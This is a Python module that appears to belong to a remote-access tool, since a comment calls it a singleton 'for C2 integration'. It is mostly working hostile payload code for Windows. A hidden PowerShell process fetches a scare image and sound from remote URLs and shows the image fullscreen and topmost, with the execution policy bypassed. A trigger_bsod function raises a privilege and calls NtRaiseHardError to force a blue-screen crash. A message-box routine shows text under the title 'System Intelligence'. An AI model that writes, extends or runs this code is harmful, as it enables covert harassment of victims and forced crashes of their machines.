import os, sys, time, threading, subprocess, ctypes, ctypes.wintypes
import tempfile, urllib.request

class JumpscareManager:
    """Native Performance Jumpscare Controller (No PyQt5, no requests)."""
    def __init__(self):
        self.is_running   = False
        self._ps_proc     = None   # track PS process for reliable stop
        self._audio_proc  = None

    def start(self, image_url, sound_url=None):
        if self.is_running:
            self.stop()            # restart cleanly
        self.is_running = True
        threading.Thread(target=self._run_native, args=(image_url, sound_url), daemon=True).start()

    def stop(self):
        self.is_running = False
        # Kill tracked PowerShell process by PID (reliable)
        if self._ps_proc and self._ps_proc.poll() is None:
            try:
                self._ps_proc.kill()
            except Exception:
                pass
        self._ps_proc = None
        # Stop any audio
        if self._audio_proc and self._audio_proc.poll() is None:
            try:
                self._audio_proc.kill()
            except Exception:
                pass
        self._audio_proc = None

    def _run_native(self, image_url, sound_url):
        # Download image using stdlib only (no requests dep)
        img_temp = tempfile.mktemp(suffix=".png")
        try:
            urllib.request.urlretrieve(image_url, img_temp)
        except Exception as e:
            print(f"[Jumpscare] Image download failed: {e}")
            self.is_running = False
            return

        # Play audio via powershell Media.SoundPlayer (no pygame dep)
        if sound_url:
            def _play_audio():
                try:
                    s_temp = tempfile.mktemp(suffix=".mp3")
                    urllib.request.urlretrieve(sound_url, s_temp)
                    ps_audio = (
                        f"Add-Type -AssemblyName presentationCore;"
                        f"$mp = New-Object System.Windows.Media.MediaPlayer;"
                        f"$mp.Open([uri]'{s_temp}');"
                        f"$mp.Play();"
                        f"Start-Sleep -Seconds 30"
                    )
                    self._audio_proc = subprocess.Popen(
                        ["powershell", "-NoProfile", "-NonInteractive",
                         "-ExecutionPolicy", "Bypass", "-Command", ps_audio],
                        creationflags=subprocess.CREATE_NO_WINDOW
                    )
                except Exception as e:
                    print(f"[Jumpscare] Audio error: {e}")
            threading.Thread(target=_play_audio, daemon=True).start()

        # Show fullscreen image via PowerShell + Windows Forms
        ps_script = f"""
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
$form = New-Object Windows.Forms.Form
$form.Text = 'OMEGA_JS_{os.getpid()}'
$form.FormBorderStyle = 'None'
$form.WindowState = 'Maximized'
$form.TopMost = $true
$form.BackColor = [System.Drawing.Color]::Black
[void]$form.Focus()
$img = [System.Drawing.Image]::FromFile('{img_temp.replace(chr(92), chr(92)+chr(92))}')
$pb = New-Object Windows.Forms.PictureBox
$pb.Dock = 'Fill'
$pb.Image = $img
$pb.SizeMode = 'Zoom'
$form.Controls.Add($pb)
$form.ShowDialog()
"""
        try:
            self._ps_proc = subprocess.Popen(
                ["powershell", "-NoProfile", "-NonInteractive",
                 "-ExecutionPolicy", "Bypass", "-Command", ps_script],
                creationflags=subprocess.CREATE_NO_WINDOW
            )
            self._ps_proc.wait()
        except Exception as e:
            print(f"[Jumpscare] PS error: {e}")
        finally:
            self.is_running = False
            # Cleanup temp file
            try:
                os.remove(img_temp)
            except Exception:
                pass


# Singleton instance for C2 integration
js_manager = JumpscareManager()


def trigger_bsod():
    """Triggers a kernel-level hard error (BSOD)."""
    try:
        # Enable SeShutdownPrivilege (19)
        prev = ctypes.c_bool()
        ctypes.windll.ntdll.RtlAdjustPrivilege(19, True, False, ctypes.byref(prev))
        # NtRaiseHardError with ResponseOption=6 (ShutdownSystem)
        resp = ctypes.wintypes.ULONG(0)
        ctypes.windll.ntdll.NtRaiseHardError(
            ctypes.c_ulong(0xC0000022), 0, 0, None, 6, ctypes.byref(resp)
        )
    except Exception as e:
        print(f"[BSOD] Error: {e}")


def show_msg(text):
    """Independent message box utility."""
    def _box():
        ctypes.windll.user32.MessageBoxW(0, text, "System Intelligence", 0x40 | 0x0)
    threading.Thread(target=_box, daemon=True).start()


if __name__ == "__main__":
    if len(sys.argv) > 1:
        cmd = sys.argv[1]
        if cmd == "bsod":
            trigger_bsod()
        if cmd == "msg" and len(sys.argv) > 2:
            show_msg(sys.argv[2])
